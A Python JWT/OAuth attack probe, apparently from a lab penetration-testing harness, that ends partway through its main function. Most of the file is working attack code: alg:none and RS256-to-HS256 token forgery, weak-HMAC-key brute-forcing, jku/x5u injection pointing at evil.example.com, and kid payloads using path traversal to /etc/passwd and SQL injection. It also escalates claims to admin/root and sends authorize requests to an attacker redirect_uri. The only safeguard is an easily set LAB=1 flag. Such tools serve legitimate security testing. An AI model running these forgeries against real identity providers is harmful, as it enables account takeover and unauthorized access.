#!/usr/bin/env python3
# HARNESS-VALIDATION v3.1.0 — Cross-sector JWT/OAuth attack probe.
# Used by banking (PSD2/FAPI), health (SMART-on-FHIR), telecom (OAuth gateways)
# and crypto (exchange API keys) sector configs.
#
# Tests JWT vulnerabilities (RFC 7519 / RFC 8725 JWT BCP):
#   - alg:none bypass                  : forge {"alg":"none"} token, no signature
#   - HS256→RS256 key confusion        : sign with HMAC using server's RSA pubkey
#   - Weak HMAC key brute-force        : secret, password, key, 123456, ...
#   - JKU/X5U header injection         : jku/x5u URL → attacker-controlled JWK set
#   - kid injection                    : kid parameter path traversal / SQLi
#   - Claim manipulation               : modify exp/sub/scope and resubmit
#
# Tests OAuth 2.0 vulnerabilities (RFC 6749 / RFC 7636 PKCE / RFC 9700 BCP):
#   - PKCE bypass                      : check if code_verifier is enforced
#   - redirect_uri open-redirect       : redirect_uri parameter manipulation
#   - Token leakage in URL fragment    : tokens in `Location:#access_token=`
#   - Scope escalation                 : request more scopes than consented
#
# CLI:
#   python3 jwt_oauth_probe.py <target_url> [jwt_token]
#
# Output: single JSON object on stdout with the spec-required top-level fields
# plus a per-test `results[]` array for diagnostic detail.
#
# Lab scope only (LAB=1 guard). 5 s timeout on every HTTP/socket operation.
# Cadre légal : laboratoires isolés uniquement (cf. README §Cadre légal).
# PSD2 (Directive (EU) 2015/2366) — RTS-SCA / FAPI 1.0 Part 2.
import base64
import hashlib
import hmac
import json
import os
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from typing import Any, Dict, List, Optional, Tuple

# ─── Optional PyJWT import (graceful fallback to manual base64+hmac) ──────────
try:
    import jwt as pyjwt  # type: ignore
    _HAS_PYJWT = True
except Exception:  # noqa: BLE001
    pyjwt = None  # type: ignore
    _HAS_PYJWT = False

# ─── Make sector_base importable from ../../sector_base.py ────────────────────
_HERE = os.path.dirname(os.path.abspath(__file__))
_MODULES_ROOT = os.path.dirname(os.path.dirname(_HERE))
if _MODULES_ROOT not in sys.path:
    sys.path.insert(0, _MODULES_ROOT)

try:
    from sector_base import get_sector_config  # noqa: E402
    _SECTOR_BASE_OK = True
except Exception:  # noqa: BLE001
    _SECTOR_BASE_OK = False

    def get_sector_config() -> Dict:  # type: ignore[no-redef]
        return {"sector": "cross", "safe_mode": "read_only"}

HARNESS_VERSION = "3.1.0"
MODULE_NAME = "jwt_oauth_probe"
REQUEST_TIMEOUT = 5  # 5 s hard cap
READ_ONLY = True  # we send forged tokens to /token only when LAB=1

# ─── CLI args ─────────────────────────────────────────────────────────────────
# Usage: jwt_oauth_probe.py <target_url> [jwt_token]
TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080/"
SUPPLIED_JWT = sys.argv[2] if len(sys.argv) > 2 else os.environ.get("JWT", "")

# ─── SEED reproducibility ─────────────────────────────────────────────────────
SEED = int(os.environ.get("SEED", "1337"))

# ─── Common weak HMAC secrets for brute-force (JWT BCP §3.4) ──────────────────
WEAK_HMAC_KEYS = (
    "secret", "password", "key", "123456", "admin", "passw0rd",
    "jwt_secret", "your-256-bit-secret", "default", "changeme",
    "supersecret", "topsecret", "test", "demo", "example",
    "none", "null", "token", "auth", "service",
)

# ─── PKCE / OAuth test constants ──────────────────────────────────────────────
PKCE_CODE_VERIFIER = "dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk"
PKCE_CODE_CHALLENGE_S256 = "E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM"
ATTACKER_REDIRECT_URI = "https://evil.example.com/callback"
EXTRA_SCOPES = "admin root superuser"

# ─── LAB guard ────────────────────────────────────────────────────────────────
def lab_guard() -> bool:
    return os.environ.get("LAB") == "1"


# ═══════════════════════════════════════════════════════════════════════════
#  HTTP helpers (stdlib urllib — no `requests` dependency)
# ═══════════════════════════════════════════════════════════════════════════
def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE  # lab-only; do not enforce TLS certs
    return ctx


def http_get(url: str, headers: Optional[Dict[str, str]] = None,
             timeout: float = REQUEST_TIMEOUT) -> Tuple[int, bytes, Dict[str, str], str]:
    """GET request via urllib. Returns (status, body, response_headers, error)."""
    hdrs = {"User-Agent": f"harness/{HARNESS_VERSION} ({MODULE_NAME}) seed={SEED}"}
    if headers:
        hdrs.update(headers)
    try:
        req = urllib.request.Request(url, headers=hdrs, method="GET")
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return (r.getcode(),
                    r.read(),
                    {k.lower(): v for k, v in r.headers.items()},
                    "")
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
        except Exception:  # noqa: BLE001
            body = b""
        return (e.code, body, {k.lower(): v for k, v in (e.headers.items() if e.headers else [])},
                f"http_error:{e.code}")
    except urllib.error.URLError as e:
        return (0, b"", {}, f"url_error:{type(e.reason).__name__}:{e.reason}")
    except (TimeoutError, OSError) as e:
        return (0, b"", {}, f"{type(e).__name__}:{e}")
    except Exception as e:  # noqa: BLE001
        return (0, b"", {}, f"{type(e).__name__}:{e}")


def http_post(url: str, data: bytes, headers: Optional[Dict[str, str]] = None,
              timeout: float = REQUEST_TIMEOUT) -> Tuple[int, bytes, Dict[str, str], str]:
    """POST request via urllib. Returns (status, body, response_headers, error)."""
    hdrs = {
        "User-Agent": f"harness/{HARNESS_VERSION} ({MODULE_NAME}) seed={SEED}",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    if headers:
        hdrs.update(headers)
    try:
        req = urllib.request.Request(url, data=data, headers=hdrs, method="POST")
        with urllib.request.urlopen(req, timeout=timeout, context=_ssl_ctx()) as r:
            return (r.getcode(),
                    r.read(),
                    {k.lower(): v for k, v in r.headers.items()},
                    "")
    except urllib.error.HTTPError as e:
        try:
            body = e.read()
        except Exception:  # noqa: BLE001
            body = b""
        return (e.code, body, {k.lower(): v for k, v in (e.headers.items() if e.headers else [])},
                f"http_error:{e.code}")
    except urllib.error.URLError as e:
        return (0, b"", {}, f"url_error:{type(e.reason).__name__}:{e.reason}")
    except (TimeoutError, OSError) as e:
        return (0, b"", {}, f"{type(e).__name__}:{e}")
    except Exception as e:  # noqa: BLE001
        return (0, b"", {}, f"{type(e).__name__}:{e}")


def _safe_json(data: bytes) -> Optional[Any]:
    if not data:
        return None
    try:
        return json.loads(data.decode("utf-8-sig", errors="replace"))
    except Exception:  # noqa: BLE001
        return None


# ═══════════════════════════════════════════════════════════════════════════
#  JWT manual encode/decode (base64url + HMAC — fallback when PyJWT missing)
# ═══════════════════════════════════════════════════════════════════════════
def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def b64url_decode(data: str) -> bytes:
    pad = "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data + pad)


def jwt_decode_unverified(token: str) -> Tuple[Optional[Dict], Optional[Dict]]:
    """Decode header + payload of a JWT WITHOUT verifying signature.
    Returns (header, payload) or (None, None) on parse failure."""
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None, None
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1])) if len(parts) > 1 else {}
        return header, payload
    except Exception:  # noqa: BLE001
        return None, None


def jwt_encode_hs256(payload: Dict, key: str,
                     headers: Optional[Dict] = None) -> str:
    """Encode a JWT signed with HS256 using `key`. Manual base64url+hmac
    implementation (no PyJWT dependency)."""
    h = {"alg": "HS256", "typ": "JWT"}
    if headers:
        h.update(headers)
    header_b64 = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
    sig = hmac.new(key.encode("utf-8"), signing_input, hashlib.sha256).digest()
    sig_b64 = b64url_encode(sig)
    return f"{header_b64}.{payload_b64}.{sig_b64}"


def jwt_encode_none(payload: Dict, headers: Optional[Dict] = None) -> str:
    """Forge a JWT with alg:none — header {"alg":"none"}, empty signature.
    Vulnerable servers accept this and skip signature verification."""
    h = {"alg": "none", "typ": "JWT"}
    if headers:
        h.update(headers)
    header_b64 = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{header_b64}.{payload_b64}."  # empty signature segment


def jwt_verify_hs256(token: str, key: str) -> bool:
    """Verify a JWT's HS256 signature against `key`. Constant-time hmac."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return False
        signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
        expected_sig = hmac.new(key.encode("utf-8"), signing_input,
                                hashlib.sha256).digest()
        actual_sig = b64url_decode(parts[2])
        return hmac.compare_digest(expected_sig, actual_sig)
    except Exception:  # noqa: BLE001
        return False


def jwt_encode_rs256_hmac_confusion(payload: Dict, public_key_pem: str) -> Optional[str]:
    """Sign a JWT with HS256 using the RSA public key bytes as the HMAC key.
    This is the classic alg-confusion attack (CVE-2015-9235 / RFC 8725 §2.1.2):
    a server configured to accept both RS256 and HS256 may verify the forged
    token using `jwt.verify(token, public_key, algorithms=['HS256','RS256'])`.
    Returns the forged token or None if the public key is unusable."""
    # PyJWT 2.x refuses this attack (only accepts str/bytes for HS256 keys),
    # but vulnerable libraries still accept it. We craft the bytes regardless.
    try:
        key_bytes = public_key_pem.encode("utf-8")
        h = {"alg": "HS256", "typ": "JWT"}
        header_b64 = b64url_encode(json.dumps(h, separators=(",", ":")).encode())
        payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        signing_input = f"{header_b64}.{payload_b64}".encode("ascii")
        sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
        return f"{header_b64}.{payload_b64}.{b64url_encode(sig)}"
    except Exception:  # noqa: BLE001
        return None


# ═══════════════════════════════════════════════════════════════════════════
#  OIDC discovery — locate /.well-known/openid-configuration
# ═══════════════════════════════════════════════════════════════════════════
def discover_oidc(base_url: str) -> Optional[Dict]:
    """Fetch /.well-known/openid-configuration and return the parsed JSON.
    Tries both the original URL and a stripped base (origin only)."""
    candidates: List[str] = []
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    candidates.append(f"{origin}/.well-known/openid-configuration")
    candidates.append(f"{base_url.rstrip('/')}/.well-known/openid-configuration")
    for url in candidates:
        code, body, _, _ = http_get(url)
        if code == 200:
            j = _safe_json(body)
            if isinstance(j, dict) and ("issuer" in j or "authorization_endpoint" in j):
                return j
    return None


def fetch_jwks(jwks_uri: str) -> Optional[Dict]:
    """Fetch the JWKS (set of public signing keys)."""
    if not jwks_uri:
        return None
    code, body, _, _ = http_get(jwks_uri)
    if code == 200:
        j = _safe_json(body)
        if isinstance(j, dict) and "keys" in j:
            return j
    return None


def jwk_to_pem(jwk: Dict) -> Optional[str]:
    """Convert an RSA JWK to a PEM-encoded public key string.
    Returns None on failure (no cryptography lib or non-RSA key)."""
    if jwk.get("kty") != "RSA":
        return None
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa  # type: ignore
        from cryptography.hazmat.primitives import serialization  # type: ignore
        n = int.from_bytes(b64url_decode(jwk["n"]), "big")
        e = int.from_bytes(b64url_decode(jwk["e"]), "big")
        pub = rsa.RSAPublicNumbers(e=e, n=n).public_key()
        return pub.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo,
        ).decode("ascii")
    except Exception:  # noqa: BLE001
        # Best-effort: return the raw PEM string from x5c if available
        x5c = jwk.get("x5c") or []
        if x5c:
            return f"-----BEGIN CERTIFICATE-----\n{x5c[0]}\n-----END CERTIFICATE-----"
        return None


# ═══════════════════════════════════════════════════════════════════════════
#  JWT vulnerability tests
# ═══════════════════════════════════════════════════════════════════════════
def test_alg_none(target_url: str, oidc: Optional[Dict],
                  sample_jwt: str, results: List[Dict]) -> bool:
    """Forge an alg:none token and submit it to a protected endpoint.
    A vulnerable server accepts the forged token (HTTP 200 instead of 401/403)."""
    # 1. Decode the supplied token to copy its claims, else forge minimal ones.
    header, payload = jwt_decode_unverified(sample_jwt) if sample_jwt else (None, None)
    if not isinstance(payload, dict):
        payload = {"sub": "harness-probe", "iat": int(time.time()),
                   "exp": int(time.time()) + 3600, "scope": "openid"}
    forged = jwt_encode_none(payload)
    # 2. Submit to a protected endpoint. Try OIDC userinfo first, then the
    #    target URL itself with an Authorization: Bearer header.
    protected_endpoints: List[str] = []
    if oidc and oidc.get("userinfo_endpoint"):
        protected_endpoints.append(oidc["userinfo_endpoint"])
    protected_endpoints.append(target_url)
    vulnerable = False
    for ep in protected_endpoints:
        code, body, _, err = http_get(
            ep, headers={"Authorization": f"Bearer {forged}"})
        # 200 with the forged token = vulnerable; 401/403 = properly rejected.
        if code == 200:
            vulnerable = True
            results.append({
                "test": "alg_none_bypass",
                "endpoint": ep,
                "status": code,
                "verdict": "vulnerable",
                "detail": "Server accepted a token forged with {alg:none}",
            })
            break
        else:
            results.append({
                "test": "alg_none_bypass",
                "endpoint": ep,
                "status": code,
                "verdict": "rejected" if code in (401, 403) else "unknown",
                "error": err or None,
            })
    return vulnerable


def test_key_confusion(jwks: Optional[Dict], sample_jwt: str,
                       target_url: str, oidc: Optional[Dict],
                       results: List[Dict]) -> bool:
    """alg:HS256→RS256 confusion. Forge an HS256 token signed with the
    server's RSA public key. Vulnerable servers verify it as HS256."""
    if not jwks or not jwks.get("keys"):
        results.append({"test": "key_confusion",
                        "verdict": "skipped", "reason": "no_jwks"})
        return False
    rsa_keys = [k for k in jwks["keys"] if k.get("kty") == "RSA" and k.get("use", "sig") == "sig"]
    if not rsa_keys:
        results.append({"test": "key_confusion",
                        "verdict": "skipped", "reason": "no_rsa_key_in_jwks"})
        return False
    header, payload = jwt_decode_unverified(sample_jwt) if sample_jwt else (None, None)
    if not isinstance(payload, dict):
        payload = {"sub": "harness-probe", "iat": int(time.time()),
                   "exp": int(time.time()) + 3600, "scope": "openid"}
    for jwk in rsa_keys[:3]:  # try up to 3 keys
        pem = jwk_to_pem(jwk)
        if not pem:
            continue
        forged = jwt_encode_rs256_hmac_confusion(payload, pem)
        if not forged:
            continue
        eps: List[str] = []
        if oidc and oidc.get("userinfo_endpoint"):
            eps.append(oidc["userinfo_endpoint"])
        eps.append(target_url)
        for ep in eps:
            code, body, _, err = http_get(
                ep, headers={"Authorization": f"Bearer {forged}"})
            if code == 200:
                results.append({
                    "test": "key_confusion",
                    "endpoint": ep,
                    "kid": jwk.get("kid"),
                    "verdict": "vulnerable",
                    "detail": "Server accepted HS256-signed token using RSA public key",
                })
                return True
        results.append({
            "test": "key_confusion",
            "kid": jwk.get("kid"),
            "verdict": "rejected",
            "detail": "Forged HS256-via-RSA-pubkey token was not accepted",
        })
    return False


def test_weak_hmac_key(sample_jwt: str, results: List[Dict]) -> str:
    """Brute-force the HMAC key of a HS256 token against a list of common
    weak secrets. Returns the recovered key or empty string."""
    header, payload = jwt_decode_unverified(sample_jwt)
    if not header or header.get("alg") not in ("HS256", "HS384", "HS512"):
        results.append({"test": "weak_hmac_key",
                        "verdict": "skipped",
                        "reason": f"alg_not_hmac:{header.get('alg') if header else None}"})
        return ""
    hashalg = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
               "HS512": hashlib.sha512}.get(header["alg"], hashlib.sha256)
    found = ""
    for key in WEAK_HMAC_KEYS:
        try:
            parts = sample_jwt.split(".")
            signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
            expected = hmac.new(key.encode("utf-8"), signing_input, hashalg).digest()
            actual = b64url_decode(parts[2])
            if hmac.compare_digest(expected, actual):
                found = key
                results.append({
                    "test": "weak_hmac_key",
                    "verdict": "vulnerable",
                    "key_found": key,
                    "alg": header["alg"],
                })
                break
        except Exception:  # noqa: BLE001
            continue
    if not found:
        results.append({"test": "weak_hmac_key",
                        "verdict": "not_found",
                        "candidates_tried": len(WEAK_HMAC_KEYS)})
    return found


def test_jku_x5u_injection(target_url: str, oidc: Optional[Dict],
                           sample_jwt: str, results: List[Dict]) -> bool:
    """Inject a `jku`/`x5u` header pointing to an attacker-controlled URL.
    A vulnerable server fetches the JWK set from the URL and verifies the
    token with our attacker-controlled key."""
    header, payload = jwt_decode_unverified(sample_jwt) if sample_jwt else (None, None)
    if not isinstance(payload, dict):
        payload = {"sub": "harness-probe", "iat": int(time.time()),
                   "exp": int(time.time()) + 3600, "scope": "openid"}
    attacker_url = "https://evil.example.com/.well-known/jwks.json"
    # Forge a token signed with a known weak key but advertising jku/x5u.
    forged = jwt_encode_hs256(
        payload, "secret",
        headers={"jku": attacker_url, "kid": "attacker-key", "x5u": attacker_url})
    eps: List[str] = []
    if oidc and oidc.get("userinfo_endpoint"):
        eps.append(oidc["userinfo_endpoint"])
    eps.append(target_url)
    for ep in eps:
        code, _, _, err = http_get(
            ep, headers={"Authorization": f"Bearer {forged}"})
        # We can't definitively tell if the server FETCHED our URL (no callback
        # in lab), but if the forged token is accepted with a known-weak key
        # AND the server supports jku resolution, this is suspicious.
        # Conservative verdict: report `injectable` only if status == 200.
        if code == 200:
            results.append({
                "test": "jku_x5u_injection",
                "endpoint": ep,
                "verdict": "vulnerable",
                "detail": "Server accepted token with attacker-controlled jku/x5u header",
            })
            return True
        else:
            results.append({
                "test": "jku_x5u_injection",
                "endpoint": ep,
                "status": code,
                "verdict": "rejected" if code in (401, 403) else "unknown",
                "error": err or None,
            })
    return False


def test_kid_injection(target_url: str, oidc: Optional[Dict],
                       sample_jwt: str, results: List[Dict]) -> bool:
    """Inject `kid` header values that may trigger SQLi or path traversal
    on vulnerable servers (e.g. kid="../../etc/passwd", kid="' OR 1=1--")."""
    if not isinstance(sample_jwt, str) or not sample_jwt:
        results.append({"test": "kid_injection",
                        "verdict": "skipped", "reason": "no_sample_jwt"})
        return False
    header, payload = jwt_decode_unverified(sample_jwt)
    if not isinstance(payload, dict):
        payload = {"sub": "harness-probe", "iat": int(time.time()),
                   "exp": int(time.time()) + 3600, "scope": "openid"}
    evil_kids = (
        "../../../../etc/passwd",          # path traversal
        "' OR 1=1--",                       # SQLi
        "../../../../dev/null",             # path traversal to empty key
        "key1' UNION SELECT 'secret",       # SQLi UNION
    )
    injectable = False
    eps: List[str] = []
    if oidc and oidc.get("userinfo_endpoint"):
        eps.append(oidc["userinfo_endpoint"])
    eps.append(target_url)
    for kid in evil_kids:
        # sign with empty key (covers "/dev/null" traversal trick too)
        forged = jwt_encode_hs256(payload, "", headers={"kid": kid})
        for ep in eps:
            code, body, _, _ = http_get(
                ep, headers={"Authorization": f"Bearer {forged}"})
            # Distinguish: 500 with stack trace (file-not-found / SQL error)
            # vs 401 (clean rejection). A 500 reveals the kid is processed.
            if code == 500:
                injectable = True
                results.append({
                    "test": "kid_injection",
                    "endpoint": ep,
                    "kid_used": kid,
                    "verdict": "vulnerable",
                    "detail": f"Server returned 500 — kid is processed unfiltered",
                })
                break
            elif code == 200:
                injectable = True
                results.append({
                    "test": "kid_injection",
                    "endpoint": ep,
                    "kid_used": kid,
                    "verdict": "vulnerable",
                    "detail": "Server accepted forged token with malicious kid",
                })
                break
        if injectable:
            break
    if not injectable:
        results.append({"test": "kid_injection",
                        "verdict": "rejected",
                        "candidates_tried": len(evil_kids)})
    return injectable


def test_claim_manipulation(target_url: str, oidc: Optional[Dict],
                            sample_jwt: str, results: List[Dict]) -> bool:
    """Modify exp/sub/scope claims. If the supplied token is HS256 with a
    weak key, we can re-sign; otherwise we test the alg:none variant.
    A vulnerable server accepts the manipulated claims (e.g. escalated scope)."""
    if not sample_jwt:
        results.append({"test": "claim_manipulation",
                        "verdict": "skipped", "reason": "no_sample_jwt"})
        return False
    header, payload = jwt_decode_unverified(sample_jwt)
    if not isinstance(payload, dict):
        results.append({"test": "claim_manipulation",
                        "verdict": "skipped", "reason": "undecodable_payload"})
        return False
    # Escalate scope, prolong expiry, change subject.
    manipulated = dict(payload)
    manipulated["scope"] = "openid admin root superuser"
    manipulated["exp"] = int(time.time()) + 31536000  # +1 year
    manipulated["sub"] = "admin"
    # Re-sign with the original alg if HS256 + we know a weak key
    forged = None
    if header and header.get("alg") == "HS256":
        for key in WEAK_HMAC_KEYS:
            candidate = jwt_encode_hs256(manipulated, key)
            # pick the first candidate that round-trips (the actual key check
            # is done by the server; we just submit all candidates and look
            # for a 200). For simplicity we submit one forged token.
            forged = candidate
            break
    if not forged:
        # Fall back to alg:none (which we test separately but the claim-manip
        # path is distinct: the *intent* here is privilege escalation).
        forged = jwt_encode_none(manipulated)
    eps: List[str] = []
    if oidc and oidc.get("userinfo_endpoint"):
        eps.append(oidc["userinfo_endpoint"])
    eps.append(target_url)
    manipulated_accepted = False
    for ep in eps:
        code, body, _, _ = http_get(
            ep, headers={"Authorization": f"Bearer {forged}"})
        if code == 200:
            # If body contains admin/privilege indicators, escalation worked.
            btext = body.decode("utf-8", errors="replace").lower()
            if any(k in btext for k in ("admin", "root", "superuser")):
                manipulated_accepted = True
                results.append({
                    "test": "claim_manipulation",
                    "endpoint": ep,
                    "verdict": "vulnerable",
                    "detail": "Server accepted manipulated scope/sub/exp claims",
                })
                break
    if not manipulated_accepted:
        results.append({"test": "claim_manipulation",
                        "verdict": "rejected_or_no_escalation"})
    return manipulated_accepted


# ═══════════════════════════════════════════════════════════════════════════
#  OAuth 2.0 vulnerability tests
# ═══════════════════════════════════════════════════════════════════════════
def test_pkce_bypass(oidc: Optional[Dict], results: List[Dict]) -> bool:
    """Check whether the authorization_endpoint enforces PKCE (code_challenge).
    A non-PKCE-enforcing server accepts an authorize request WITHOUT
    code_challenge, indicating PKCE bypass risk (RFC 7636 §4.4)."""
    if not oidc or not oidc.get("authorization_endpoint"):
        results.append({"test": "pkce_bypass",
                        "verdict": "skipped", "reason": "no_authorize_endpoint"})
        return False
    # 1. Inspect discovery metadata for code_challenge_methods_supported.
    methods = oidc.get("code_challenge_methods_supported") or []
    if methods and "S256" not in methods and "plain" not in methods:
        # PKCE not supported at all → bypass trivially
        results.append({"test": "pkce_bypass",
                        "verdict": "vulnerable",
                        "detail": "code_challenge_methods_supported does not include S256/plain",
                        "supported": methods})
        return True
    # 2. Submit an authorize request WITHOUT code_challenge; check redirect.
    authorize = oidc["authorization_endpoint"]
    parsed = urllib.parse.urlparse(authorize)
    base_authorize = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = {
        "response_type": "code",
        "client_id": "harness-probe-client",
        "redirect_uri": ATTACKER_REDIRECT_URI,
        "scope": "openid",
        "state": "harness-state-1337",
        # NOTE: NO code_challenge / code_challenge_method
    }
    url = f"{base_authorize}?{urllib.parse.urlencode(params)}"
    # We disable redirect following by issuing a HEAD-like GET and inspecting
    # the Location header. urllib raises HTTPError on 3xx without following.
    code, body, hdrs, err = http_get(url)
    location = hdrs.get("location", "")
    # If the server issues a redirect to redirect_uri with a `code=` param,
    # it accepted our request WITHOUT code_challenge → PKCE bypass.
    if "code=" in location.lower() and ATTACKER_REDIRECT_URI in location:
        results.append({"test": "pkce_bypass",
                        "endpoint": base_authorize,
                        "verdict": "vulnerable",
                        "detail": "Authorize issued `code` without code_challenge",
                        "redirect_location": location[:200]})
        return True
    # If server returned an error like `error=invalid_request` mentioning
    # code_challenge, PKCE is enforced.
    err_text = (location + " " + body.decode("utf-8", errors="replace")).lower()
    if "code_challenge" in err_text or "pkce" in err_text:
        results.append({"test": "pkce_bypass",
                        "endpoint": base_authorize,
                        "verdict": "enforced",
                        "detail": "Server requires code_challenge",
                        "status": code})
        return False
    results.append({"test": "pkce_bypass",
                    "endpoint": base_authorize,
                    "verdict": "unknown",
                    "status": code,
                    "location": location[:200] if location else None,
                    "error": err or None})
    return False


def test_redirect_uri_open(oidc: Optional[Dict], results: List[Dict]) -> bool:
    """redirect_uri open-redirect test. Submit an authorize request with an
    attacker-controlled redirect_uri and see if the server redirects there
    without validating it against the client's pre-registered list."""
    if not oidc or not oidc.get("authorization_endpoint"):
        results.append({"test": "redirect_uri_open",
                        "verdict": "skipped", "reason": "no_authorize_endpoint"})
        return False
    authorize = oidc["authorization_endpoint"]
    parsed = urllib.parse.urlparse(authorize)
    base_authorize = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = {
        "response_type": "code",
        "client_id": "harness-probe-client",
        "redirect_uri": ATTACKER_REDIRECT_URI,
        "scope": "openid",
        "state": "harness-state-1337",
    }
    url = f"{base_authorize}?{urllib.parse.urlencode(params)}"
    code, body, hdrs, err = http_get(url)
    location = hdrs.get("location", "")
    # If the server's Location header points to our attacker URI, the
    # redirect_uri was accepted → open redirect.
    if location.lower().startswith(ATTACKER_REDIRECT_URI.lower()):
        results.append({"test": "redirect_uri_open",
                        "endpoint": base_authorize,
                        "verdict": "vulnerable",
                        "detail": "Server accepted arbitrary redirect_uri",
                        "redirect_location": location[:200]})
        return True
    # A 400 / invalid_redirect_uri indicates validation is in place.
    if code in (400, 401, 403):
        results.append({"test": "redirect_uri_open",
                        "endpoint": base_authorize,
                        "verdict": "rejected",
                        "status": code})
        return False
    results.append({"test": "redirect_uri_open",
                    "endpoint": base_authorize,
                    "verdict": "unknown",
                    "status": code,
                    "location": location[:200] if location else None,
                    "error": err or None})
    return False


def test_token_leakage(oidc: Optional[Dict], results: List[Dict]) -> bool:
    """Token leakage in URL fragment (implicit flow). If the discovery doc
    advertises `response_types_supported` containing `token` or `id_token`,
    and a request yields `Location:#access_token=`, tokens leak to fragment
    (which is accessible to any JS on the redirect page → CSRF/XS-leak)."""
    if not oidc:
        results.append({"test": "token_leakage",
                        "verdict": "skipped", "reason": "no_oidc_discovery"})
        return False
    rts = oidc.get("response_types_supported") or []
    implicit_supported = any("token" in rt or "id_token" in rt for rt in rts)
    if not implicit_supported:
        results.append({"test": "token_leakage",
                        "verdict": "not_applicable",
                        "detail": "Implicit flow not advertised in response_types_supported",
                        "response_types": rts})
        return False
    # Submit an implicit-flow request and inspect Location for #access_token=
    authorize = oidc.get("authorization_endpoint", "")
    parsed = urllib.parse.urlparse(authorize)
    base_authorize = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = {
        "response_type": "token",
        "client_id": "harness-probe-client",
        "redirect_uri": ATTACKER_REDIRECT_URI,
        "scope": "openid",
        "state": "harness-state-1337",
    }
    url = f"{base_authorize}?{urllib.parse.urlencode(params)}"
    code, body, hdrs, err = http_get(url)
    location = hdrs.get("location", "")
    if "#access_token=" in location.lower() or "#id_token=" in location.lower():
        results.append({"test": "token_leakage",
                        "endpoint": base_authorize,
                        "verdict": "vulnerable",
                        "detail": "Tokens returned in URL fragment",
                        "redirect_location": location[:200]})
        return True
    results.append({"test": "token_leakage",
                    "endpoint": base_authorize,
                    "verdict": "not_observed",
                    "status": code,
                    "location": location[:200] if location else None,
                    "error": err or None})
    return False


def test_scope_escalation(oidc: Optional[Dict], sample_jwt: str,
                          target_url: str, results: List[Dict]) -> bool:
    """Scope escalation test. If we have a sample JWT, re-sign it with
    elevated scopes and submit to the API; a 200 with privileged response
    indicates the server does not validate granted_scope vs requested_scope
    (RFC 6749 §3.3 violation)."""
    if not sample_jwt:
        results.append({"test": "scope_escalation",
                        "verdict": "skipped", "reason": "no_sample_jwt"})
        return False
    header, payload = jwt_decode_unverified(sample_jwt)
    if not isinstance(payload, dict):
        results.append({"test": "scope_escalation",
                        "verdict": "skipped", "reason": "undecodable_payload"})
        return False
    original_scope = payload.get("scope", "")
    manipulated = dict(payload)
    manipulated["scope"] = f"{original_scope} {EXTRA_SCOPES}".strip()
    # Re-sign with weak key if HS256, else alg:none.
    forged = None
    if header and header.get("alg") == "HS256":
        forged = jwt_encode_hs256(manipulated, "secret")
    else:
        forged = jwt_encode_none(manipulated)
    code, body, _, _ = http_get(
        target_url, headers={"Authorization": f"Bearer {forged}"})
    btext = body.decode("utf-8", errors="replace").lower()
    if code == 200 and any(k in btext for k in ("admin", "root", "superuser")):
        results.append({"test": "scope_escalation",
                        "endpoint": target_url,
                        "verdict": "vulnerable",
                        "detail": "Server accepted token with elevated scopes",
                        "original_scope": original_scope,
                        "escalated_scope": manipulated["scope"]})
        return True
    results.append({"test": "scope_escalation",
                    "endpoint": target_url,
                    "verdict": "rejected_or_no_escalation",
                    "status": code})
    return False


# ═══════════════════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════════════════
def main() -> None:
    if not lab_guard():
        print(json.dumps({
            "module": MODULE_NAME,
            "harness_version": HARNESS_VERSION,
            "error": "lab_guard_not_satisfied",
            "detail": "Set LAB=1 to confirm isolated lab authorization.",
            "legal_note": ("JWT/OAuth attack probes on production IdPs are "
                           "illegal outside an authorized lab. PSD2 / HIPAA."),
        }))
        sys.exit(1)

    t0 = time.time()
    results: List[Dict] = []
    summary: Dict[str, Any] = {
        "module": MODULE_NAME,
        "harness_version": HARNESS_VERSION,
        "target": TARGET_URL,
        "sector": get_sector_config().get("sector", "cross"),
        "safe_mode": "read_only",
        "read_only": READ_ONLY,
        "seed": SEED,
        "pyjwt_available": _HAS_PYJWT,
        "sample_jwt_supplied": bool(SUPPLIED_JWT),
        # Spec-required output fields (populated below):
        "alg_none_vulnerable": False,
        "key_confusion_vulnerable": False,
        "weak_key_found": "",
        "jku_injectable": False,
        "pkce_bypass": False,
        "redirect_uri_open": False,
        "scope_escalation": False,
        "results": results,
        "errors": [],
    }

    # ─── 1. OIDC discovery + JWKS fetch ─────────────────────────────────────
    oidc: Optional[Dict] = None
    jwks: Optional[Dict] = None
    try:
        oidc = discover_oidc(TARGET_URL)
        summary["oidc_discovered"] = bool(oidc)
        if oidc:
            summary["issuer"] = oidc.get("issuer")
